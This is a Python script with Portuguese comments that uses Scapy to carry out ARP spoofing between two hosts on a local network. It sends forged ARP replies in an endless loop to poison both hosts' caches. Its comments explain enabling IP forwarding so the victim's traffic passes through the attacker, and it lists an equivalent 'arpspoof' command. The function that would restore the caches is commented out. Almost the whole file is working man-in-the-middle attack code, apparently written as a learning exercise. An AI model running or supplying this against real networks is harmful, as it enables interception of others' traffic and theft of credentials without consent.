# srp = Use quando você está enviando pacotes que contêm cabeçalhos de camada 2, como Ether():
# Mais fácil ;)
# sudo arpspoof -i eth0 -t 192.168.0.101 192.168.0.1


# serve para ativar o encaminhamento de pacotes IP (IP forwarding) no Linux.
# Quando o IP forwarding está ativado, o sistema passa a agir como um roteador, ou seja:
# Ele encaminha pacotes de uma interface de rede para outra.
# Isso permite que o tráfego entre redes diferentes atravesse esse host.
# Se você for fazer um ataque ARP spoofing (por exemplo com Scapy ou Ettercap), essa configuração é essencial para que os pacotes da vítima passem por você e cheguem até o destino final (como o roteador).

#sudo su
# echo 1 > /proc/sys/net/ipv4/ip_forward


import scapy.all as scapy
import time

def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    finalpacket = broadcast/arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    
    mac = answer[0][1].hwsrc
    

    return mac


def spoof_arp(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    # op=2 -> ARP Reply	Está respondendo: "O MAC do IP X é Y"
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)

#restaura a tabela do alvo
# def restore(destination_ip, source_ip):
#     source_mac = get_target_mac(source_ip)
#     destionation_mac = get_target_mac(destination_ip)
#     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destionation_mac, psrc=source_ip)
#     scapy.send(packet, count=4,verbose=False)


def main():
    try:
        while True:
            # O 100.6 o IP 100.1 sou eu (Muda na tabela ARP do 100.6 o MAC)
            spoof_arp("192.168.100.1", "192.168.100.6")
            # O 100.1 eu (hacker) sou o IP 100.6
            spoof_arp("192.168.100.6", "192.168.100.1")
            
            # Pauza a execução por 2s (talvez ideal para burlar o roteador que tenha firewall bom)
            # time.sleep(1)

    except KeyboardInterrupt:
        print('ERROROORORORO')

main()

